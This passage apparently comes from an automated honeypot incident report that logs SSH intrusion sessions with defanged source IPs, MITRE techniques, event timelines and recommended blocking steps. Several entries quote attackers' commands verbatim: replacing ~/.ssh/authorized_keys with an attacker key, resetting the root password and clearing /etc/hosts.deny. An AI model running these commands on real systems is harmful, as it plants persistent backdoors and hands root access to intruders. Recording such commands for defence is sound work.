| `2026-05-22 12:03:36` | `cowrie.login.success` |
| `2026-05-22 12:03:36` | `cowrie.session.params` |
| `2026-05-22 12:03:36` | `cowrie.command.input` |
| `2026-05-22 12:03:36` | `cowrie.command.failed` |
| `2026-05-22 12:03:36` | `cowrie.log.closed` |
| `2026-05-22 12:03:36` | `cowrie.session.params` |
| `2026-05-22 12:03:36` | `cowrie.command.input` |
| `2026-05-22 12:03:36` | `cowrie.session.file_download` |
| `2026-05-22 12:03:36` | `cowrie.log.closed` |
| `2026-05-22 12:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.17.99[.]102` to AbuseIPDB if not already reported
- [ ] Block `46.17.99[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-883839320231

| Field | Detail |
|---|---|
| **Source IP** | `46.17.99[.]102` |
| **First Seen** | 2026-05-22 12:03 |
| **Last Seen** | 2026-05-22 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:03:38` | `cowrie.session.connect` |
| `2026-05-22 12:03:38` | `cowrie.client.version` |
| `2026-05-22 12:03:39` | `cowrie.client.kex` |
| `2026-05-22 12:03:39` | `cowrie.login.success` |
| `2026-05-22 12:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.17.99[.]102` to AbuseIPDB if not already reported
- [ ] Block `46.17.99[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbcc8e8487e

| Field | Detail |
|---|---|
| **Source IP** | `180.184.43[.]90` |
| **First Seen** | 2026-05-22 12:10 |
| **Last Seen** | 2026-05-22 12:11 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Rm5xofTu80DR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:10:35` | `cowrie.session.connect` |
| `2026-05-22 12:10:36` | `cowrie.client.version` |
| `2026-05-22 12:10:36` | `cowrie.client.kex` |
| `2026-05-22 12:10:37` | `cowrie.login.success` |
| `2026-05-22 12:10:37` | `cowrie.session.params` |
| `2026-05-22 12:10:37` | `cowrie.command.input` |
| `2026-05-22 12:10:37` | `cowrie.command.failed` |
| `2026-05-22 12:10:37` | `cowrie.log.closed` |
| `2026-05-22 12:10:37` | `cowrie.session.params` |
| `2026-05-22 12:10:37` | `cowrie.command.input` |
| `2026-05-22 12:10:38` | `cowrie.session.file_download` |
| `2026-05-22 12:10:38` | `cowrie.log.closed` |
| `2026-05-22 12:11:06` | `cowrie.session.params` |
| `2026-05-22 12:11:06` | `cowrie.command.input` |
| `2026-05-22 12:11:06` | `cowrie.log.closed` |
| `2026-05-22 12:11:07` | `cowrie.session.params` |
| `2026-05-22 12:11:07` | `cowrie.command.input` |
| `2026-05-22 12:11:07` | `cowrie.log.closed` |
| `2026-05-22 12:11:07` | `cowrie.session.params` |
| `2026-05-22 12:11:07` | `cowrie.command.input` |
| `2026-05-22 12:11:08` | `cowrie.session.file_download` |
| `2026-05-22 12:11:08` | `cowrie.log.closed` |
| `2026-05-22 12:11:08` | `cowrie.session.params` |
| `2026-05-22 12:11:08` | `cowrie.command.input` |
| `2026-05-22 12:11:09` | `cowrie.log.closed` |
| `2026-05-22 12:11:09` | `cowrie.session.params` |
| `2026-05-22 12:11:09` | `cowrie.command.input` |
| `2026-05-22 12:11:09` | `cowrie.log.closed` |
| `2026-05-22 12:11:09` | `cowrie.session.params` |
| `2026-05-22 12:11:09` | `cowrie.command.input` |
| `2026-05-22 12:11:09` | `cowrie.command.input` |
| `2026-05-22 12:11:10` | `cowrie.log.closed` |
| `2026-05-22 12:11:10` | `cowrie.session.params` |
| `2026-05-22 12:11:10` | `cowrie.command.input` |
| `2026-05-22 12:11:10` | `cowrie.log.closed` |
| `2026-05-22 12:11:10` | `cowrie.session.params` |
| `2026-05-22 12:11:10` | `cowrie.command.input` |
| `2026-05-22 12:11:11` | `cowrie.log.closed` |
| `2026-05-22 12:11:11` | `cowrie.session.params` |
| `2026-05-22 12:11:11` | `cowrie.command.input` |
| `2026-05-22 12:11:11` | `cowrie.log.closed` |
| `2026-05-22 12:11:11` | `cowrie.session.params` |
| `2026-05-22 12:11:11` | `cowrie.command.input` |
| `2026-05-22 12:11:12` | `cowrie.log.closed` |
| `2026-05-22 12:11:12` | `cowrie.session.params` |
| `2026-05-22 12:11:12` | `cowrie.command.input` |
| `2026-05-22 12:11:12` | `cowrie.log.closed` |
| `2026-05-22 12:11:12` | `cowrie.session.params` |
| `2026-05-22 12:11:12` | `cowrie.command.input` |
| `2026-05-22 12:11:13` | `cowrie.log.closed` |
| `2026-05-22 12:11:13` | `cowrie.session.params` |
| `2026-05-22 12:11:13` | `cowrie.command.input` |
| `2026-05-22 12:11:13` | `cowrie.log.closed` |
| `2026-05-22 12:11:13` | `cowrie.session.params` |
| `2026-05-22 12:11:13` | `cowrie.command.input` |
| `2026-05-22 12:11:14` | `cowrie.log.closed` |
| `2026-05-22 12:11:14` | `cowrie.session.params` |
| `2026-05-22 12:11:14` | `cowrie.command.input` |
| `2026-05-22 12:11:14` | `cowrie.log.closed` |
| `2026-05-22 12:11:14` | `cowrie.session.params` |
| `2026-05-22 12:11:14` | `cowrie.command.input` |
| `2026-05-22 12:11:15` | `cowrie.log.closed` |
| `2026-05-22 12:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.43[.]90` to AbuseIPDB if not already reported
- [ ] Block `180.184.43[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2860948e15e2

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]107` |
| **First Seen** | 2026-05-22 12:19 |
| **Last Seen** | 2026-05-22 12:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:19:31` | `cowrie.session.connect` |
| `2026-05-22 12:19:31` | `cowrie.client.version` |
| `2026-05-22 12:19:31` | `cowrie.client.kex` |
| `2026-05-22 12:19:32` | `cowrie.login.success` |
| `2026-05-22 12:19:33` | `cowrie.session.params` |
| `2026-05-22 12:19:33` | `cowrie.command.input` |
| `2026-05-22 12:19:33` | `cowrie.command.failed` |
| `2026-05-22 12:19:34` | `cowrie.log.closed` |
| `2026-05-22 12:19:34` | `cowrie.session.params` |
| `2026-05-22 12:19:34` | `cowrie.command.input` |
| `2026-05-22 12:19:34` | `cowrie.session.file_download` |
| `2026-05-22 12:19:34` | `cowrie.log.closed` |
| `2026-05-22 12:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3d01c2f874e

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]107` |
| **First Seen** | 2026-05-22 12:19 |
| **Last Seen** | 2026-05-22 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:19:37` | `cowrie.session.connect` |
| `2026-05-22 12:19:37` | `cowrie.client.version` |
| `2026-05-22 12:19:38` | `cowrie.client.kex` |
| `2026-05-22 12:19:39` | `cowrie.login.success` |
| `2026-05-22 12:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11f747ab53df

| Field | Detail |
|---|---|
| **Source IP** | `222.107.254[.]110` |
| **First Seen** | 2026-05-22 12:22 |
| **Last Seen** | 2026-05-22 12:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:22:34` | `cowrie.session.connect` |
| `2026-05-22 12:22:34` | `cowrie.client.version` |
| `2026-05-22 12:22:35` | `cowrie.client.kex` |
| `2026-05-22 12:22:35` | `cowrie.login.success` |
| `2026-05-22 12:22:36` | `cowrie.session.params` |
| `2026-05-22 12:22:36` | `cowrie.command.input` |
| `2026-05-22 12:22:36` | `cowrie.command.failed` |
| `2026-05-22 12:22:36` | `cowrie.log.closed` |
| `2026-05-22 12:22:36` | `cowrie.session.params` |
| `2026-05-22 12:22:36` | `cowrie.command.input` |
| `2026-05-22 12:22:36` | `cowrie.session.file_download` |
| `2026-05-22 12:22:36` | `cowrie.log.closed` |
| `2026-05-22 12:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.254[.]110` to AbuseIPDB if not already reported
- [ ] Block `222.107.254[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2c56a2cf364

| Field | Detail |
|---|---|
| **Source IP** | `222.107.254[.]110` |
| **First Seen** | 2026-05-22 12:22 |
| **Last Seen** | 2026-05-22 12:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:22:38` | `cowrie.session.connect` |
| `2026-05-22 12:22:38` | `cowrie.client.version` |
| `2026-05-22 12:22:38` | `cowrie.client.kex` |
| `2026-05-22 12:22:39` | `cowrie.login.success` |
| `2026-05-22 12:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.254[.]110` to AbuseIPDB if not already reported
- [ ] Block `222.107.254[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-721dec31357a

| Field | Detail |
|---|---|
| **Source IP** | `102.218.89[.]110` |
| **First Seen** | 2026-05-22 12:27 |
| **Last Seen** | 2026-05-22 12:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:27:55` | `cowrie.session.connect` |
| `2026-05-22 12:27:55` | `cowrie.client.version` |
| `2026-05-22 12:27:55` | `cowrie.client.kex` |
| `2026-05-22 12:27:56` | `cowrie.login.success` |
| `2026-05-22 12:27:57` | `cowrie.session.params` |
| `2026-05-22 12:27:57` | `cowrie.command.input` |
| `2026-05-22 12:27:57` | `cowrie.command.failed` |
| `2026-05-22 12:27:58` | `cowrie.log.closed` |
| `2026-05-22 12:27:58` | `cowrie.session.params` |
| `2026-05-22 12:27:58` | `cowrie.command.input` |
| `2026-05-22 12:27:58` | `cowrie.session.file_download` |
| `2026-05-22 12:27:58` | `cowrie.log.closed` |
| `2026-05-22 12:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.218.89[.]110` to AbuseIPDB if not already reported
- [ ] Block `102.218.89[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a889e83546

| Field | Detail |
|---|---|
| **Source IP** | `102.218.89[.]110` |
| **First Seen** | 2026-05-22 12:28 |
| **Last Seen** | 2026-05-22 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:28:01` | `cowrie.session.connect` |
| `2026-05-22 12:28:01` | `cowrie.client.version` |
| `2026-05-22 12:28:02` | `cowrie.client.kex` |
| `2026-05-22 12:28:03` | `cowrie.login.success` |
| `2026-05-22 12:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.218.89[.]110` to AbuseIPDB if not already reported
- [ ] Block `102.218.89[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b8be61fca3

| Field | Detail |
|---|---|
| **Source IP** | `194.233.91[.]154` |
| **First Seen** | 2026-05-22 13:17 |
| **Last Seen** | 2026-05-22 13:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:17:19` | `cowrie.session.connect` |
| `2026-05-22 13:17:19` | `cowrie.client.version` |
| `2026-05-22 13:17:19` | `cowrie.client.kex` |
| `2026-05-22 13:17:20` | `cowrie.login.success` |
| `2026-05-22 13:17:21` | `cowrie.session.params` |
| `2026-05-22 13:17:21` | `cowrie.command.input` |
| `2026-05-22 13:17:21` | `cowrie.command.failed` |
| `2026-05-22 13:17:21` | `cowrie.log.closed` |
| `2026-05-22 13:17:22` | `cowrie.session.params` |
| `2026-05-22 13:17:22` | `cowrie.command.input` |
| `2026-05-22 13:17:22` | `cowrie.session.file_download` |
| `2026-05-22 13:17:22` | `cowrie.log.closed` |
| `2026-05-22 13:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.233.91[.]154` to AbuseIPDB if not already reported
- [ ] Block `194.233.91[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06acfde76b86

| Field | Detail |
|---|---|
| **Source IP** | `194.233.91[.]154` |
| **First Seen** | 2026-05-22 13:17 |
| **Last Seen** | 2026-05-22 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:17:24` | `cowrie.session.connect` |
| `2026-05-22 13:17:24` | `cowrie.client.version` |
| `2026-05-22 13:17:24` | `cowrie.client.kex` |
| `2026-05-22 13:17:25` | `cowrie.login.success` |
| `2026-05-22 13:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.233.91[.]154` to AbuseIPDB if not already reported
- [ ] Block `194.233.91[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b2c10d3f7e9

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 13:43 |
| **Last Seen** | 2026-05-22 13:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:43:23` | `cowrie.session.connect` |
| `2026-05-22 13:43:23` | `cowrie.client.version` |
| `2026-05-22 13:43:23` | `cowrie.client.kex` |
| `2026-05-22 13:43:24` | `cowrie.login.success` |
| `2026-05-22 13:43:25` | `cowrie.session.params` |
| `2026-05-22 13:43:25` | `cowrie.command.input` |
| `2026-05-22 13:43:25` | `cowrie.command.failed` |
| `2026-05-22 13:43:25` | `cowrie.log.closed` |
| `2026-05-22 13:43:26` | `cowrie.session.params` |
| `2026-05-22 13:43:26` | `cowrie.command.input` |
| `2026-05-22 13:43:26` | `cowrie.session.file_download` |
| `2026-05-22 13:43:26` | `cowrie.log.closed` |
| `2026-05-22 13:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88fcd3d7058e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 13:43 |
| **Last Seen** | 2026-05-22 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:43:29` | `cowrie.session.connect` |
| `2026-05-22 13:43:29` | `cowrie.client.version` |
| `2026-05-22 13:43:30` | `cowrie.client.kex` |
| `2026-05-22 13:43:31` | `cowrie.login.success` |
| `2026-05-22 13:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-655c8cf71826

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-05-22 13:49 |
| **Last Seen** | 2026-05-22 13:51 |
| **Session Duration** | 113s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ijbBir9BmNx4"|chpasswd|bash, top` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:49:52` | `cowrie.session.connect` |
| `2026-05-22 13:49:52` | `cowrie.client.version` |
| `2026-05-22 13:49:55` | `cowrie.client.kex` |
| `2026-05-22 13:50:04` | `cowrie.login.success` |
| `2026-05-22 13:50:09` | `cowrie.session.params` |
| `2026-05-22 13:50:09` | `cowrie.command.input` |
| `2026-05-22 13:50:09` | `cowrie.command.failed` |
| `2026-05-22 13:50:11` | `cowrie.log.closed` |
| `2026-05-22 13:50:11` | `cowrie.session.params` |
| `2026-05-22 13:50:11` | `cowrie.command.input` |
| `2026-05-22 13:50:14` | `cowrie.session.file_download` |
| `2026-05-22 13:50:14` | `cowrie.log.closed` |
| `2026-05-22 13:50:31` | `cowrie.session.params` |
| `2026-05-22 13:50:31` | `cowrie.command.input` |
| `2026-05-22 13:50:34` | `cowrie.log.closed` |
| `2026-05-22 13:50:35` | `cowrie.session.params` |
| `2026-05-22 13:50:35` | `cowrie.command.input` |
| `2026-05-22 13:51:41` | `cowrie.session.params` |
| `2026-05-22 13:51:41` | `cowrie.command.input` |
| `2026-05-22 13:51:42` | `cowrie.log.closed` |
| `2026-05-22 13:51:42` | `cowrie.session.params` |
| `2026-05-22 13:51:42` | `cowrie.command.input` |
| `2026-05-22 13:51:43` | `cowrie.log.closed` |
| `2026-05-22 13:51:43` | `cowrie.session.params` |
| `2026-05-22 13:51:43` | `cowrie.command.input` |
| `2026-05-22 13:51:43` | `cowrie.log.closed` |
| `2026-05-22 13:51:44` | `cowrie.session.params` |
| `2026-05-22 13:51:44` | `cowrie.command.input` |
| `2026-05-22 13:51:44` | `cowrie.log.closed` |
| `2026-05-22 13:51:45` | `cowrie.session.params` |
| `2026-05-22 13:51:45` | `cowrie.command.input` |
| `2026-05-22 13:51:45` | `cowrie.log.closed` |
| `2026-05-22 13:51:45` | `cowrie.session.params` |
| `2026-05-22 13:51:45` | `cowrie.command.input` |
| `2026-05-22 13:51:46` | `cowrie.log.closed` |
| `2026-05-22 13:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c94d4aeac6f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 13:50 |
| **Last Seen** | 2026-05-22 13:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
